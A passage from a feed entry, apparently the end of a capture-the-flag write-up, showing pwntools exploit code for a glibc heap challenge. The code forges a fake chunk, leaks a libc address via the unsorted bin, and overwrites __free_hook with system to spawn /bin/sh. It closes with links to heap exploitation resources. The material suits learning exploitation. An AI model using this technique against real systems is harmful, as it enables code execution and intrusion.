			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Empty Space
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;),	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Next Previous Size
		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

mem_write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x602050&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,
			p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602050		Previous Size 
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x501&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602058		Chunk Size (A=0, M=0, P=1)
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602060[name_buffer]	Forward Pointer
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602068		Backward Pointer
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602070		Empty Space
			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x602060&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;),	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602088[malloced] 	Overwrite the last malloced value
		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x60&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Next free will be free(0x602060) because we overwrote the last malloced value.

# Note that we need the free to be 0x602060 because free expects the user region of the chunk,
# not the start of the chunk

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free()  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# free(0x602060)

# This free will overwrite the forward and backward pointer. Since this chunk is the only chunk 
# stored in an unsorted bin, the fwd and bck pointers will point to the location of the bin within
# libc. This location will have a constant offset with libc base.

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_CHUNK_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x3ebca0

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;leaked_chunk_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;u64(get_info()[:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Leaked address of malloc chunk

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;leaked_chunk_addr &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_CHUNK_OFFSET
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;libc.address &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE

&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Leaked chunk at &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(leaked_chunk_addr))
info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found libc base: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LIBC_BASE&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;))
info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;Found __free_hook address: &amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;__free_hook&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]))

mem_write(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;__free_hook&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;] , p64(libc.symbols[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;system&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;]), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
malloc(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x50&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&#x2F;bin&#x2F;sh&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;\x00&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)

free()

r.interactive()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;h1 id=&quot;further-reading&quot;&gt;Further Reading&lt;&#x2F;h1&gt;
&lt;p&gt;These are some resources that I found helpful when solving this challenge.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;azeria-labs.com&#x2F;heap-exploitation-part-2-glibc-heap-free-bins&#x2F;&quot;&gt;https:&#x2F;&#x2F;azeria-labs.com&#x2F;heap-exploitation-part-2-glibc-heap-free-bins&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap&#x2F;blob&#x2F;master&#x2F;glibc_2.26&#x2F;tcache_poisoning.c&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;shellphish&#x2F;how2heap&#x2F;blob&#x2F;master&#x2F;glibc_2.26&#x2F;tcache_poisoning.c&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;&quot;&gt;https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
</content>
	</entry>
</feed>
